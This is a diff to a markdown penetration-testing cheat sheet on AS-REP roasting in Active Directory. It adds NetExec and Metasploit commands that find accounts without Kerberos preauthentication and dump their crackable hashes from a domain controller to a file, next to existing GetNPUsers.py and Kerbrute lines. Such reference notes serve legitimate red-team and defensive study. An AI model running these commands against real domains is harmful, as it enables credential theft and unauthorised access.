@@ -15,6 +15,8 @@
     * `Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol`
   * _**ADModule**_
     * `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True}  -Properties DoesNotRequirePreAuth`
+  * _**NXC**_
+    * `nxc ldap <DC-IP> -u "users.txt" -p '' -k`
 
 ### Capturing Hashes
 
@@ -26,6 +28,14 @@
   * &#x20;`GetNPUsers.py <domain>/ -dc-ip <ip> -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass`&#x20;
 * [Kerbrute](https://github.com/ropnop/kerbrute)
   * `kerbrute userenum --dc <IP> -d <domain> wordlist.txt`
+* **Metasploit**
+  * `use auxiliary/gather/asrep`    \
+    `set rhosts <DC-IP>`    \
+    `set domain <value>`    \
+    `set user_file users.txt`    \
+    `run`
+* **NXC**
+  * `nxc ldap <DC-IP> -u "users.txt" -p '' --asreproast output.txt`
 
 ### Force Disable Kerberos Preauth
 
